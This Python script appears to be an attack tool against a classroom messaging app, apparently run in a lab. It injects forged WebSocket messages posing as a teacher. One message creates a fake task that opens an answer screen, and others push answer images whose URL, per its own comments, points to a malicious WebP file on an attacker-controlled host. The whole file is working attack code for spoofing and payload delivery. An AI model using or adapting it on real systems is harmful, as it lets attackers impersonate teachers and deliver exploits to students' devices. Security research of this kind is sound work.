# -*- coding: utf-8 -*-
"""inject_carrier.py - 造载体 + 投图片
步骤:
  1) type=0 TaskDetail(itemType=2) -> 端侧 recivieNewTask -> jumpToTaskDetail
     -> startSimpleTopicActivity  (打开简版答题界面 = 注册答案/图片监听器)
  2) type=1020007 (simple_tea) 文档答案, ImageAnswerBean.onlineUrl = 我们的恶意 WebP URL
  3) 备用 type=225 教师批改答案
"""
import json
import os
import time

BASE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(BASE, "ws_inject.txt")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"
IMG = "http://%s/x.png" % OUR


def env(mtype, data, cid, tag, cmd=0, frm="teacher"):
    return json.dumps({
        "cmd": cmd, "ct": "", "from": frm, "gt": 0, "cId": cid,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
    }, ensure_ascii=False)


def inj(js, label, wait=9):
    with open(INJ, "w", encoding="utf-8") as f:
        f.write(js)
    print("INJ %s" % label, flush=True)
    time.sleep(wait)


def main():
    now = int(time.time() * 1000)
    td = {
        "taskId": "LAB_T2", "subTaskId": "LAB_S2", "allTaskId": "LAB_T2",
        "classroomId": ROOM, "classroomName": "lab",
        "desktopId": "LAB_D2", "subDesktopId": "LAB_D2",
        "defaultDesktopId": "LAB_D2", "defaultDesktopName": "lab",
        "sourceId": "LAB_R2", "itemType": 2, "taskType": 2,
        "taskCreateMode": 1, "pptSource": 1, "isFromPPT": 0,
        "number": 1, "originTotalNumber": 1, "content": "lab",
        "memo": "", "createTime": now, "expectedSendDate": now,
        "completed": False, "showStatus": 1, "percent": 0, "progress": "0",
        "positive": 1, "negative": 0, "score": 0.0, "studyTime": 0,
        "viewedIds": "", "viewedNum": 0,
        "resourceInfo": {"sourceId": "LAB_R2", "taskId": "LAB_T2",
                         "name": "lab", "type": 1, "zipUrl": "",
                         "createTime": now},
    }
    js = json.dumps(td, ensure_ascii=False)
    # 1) 造载体(canvas_tag 的 type=0 = CREATE_NEW_TASK)
    inj(env(0, js, "179PC0001", "canvas_tag"), "type=0 TaskDetail(itemType=2) 造载体", 14)
    # 2) 投答案图片(simple_tea)
    bean = [{"index": 1, "localPath": "", "onlineUrl": IMG}]
    for t in (1020007, 225, 226):
        inj(env(t, json.dumps(bean, ensure_ascii=False), "179PC1%03d" % t, "simple_tea"),
            "type=%d 答案图片 onlineUrl=%s" % (t, IMG), 8)
    print("done", flush=True)


if __name__ == "__main__":
    main()
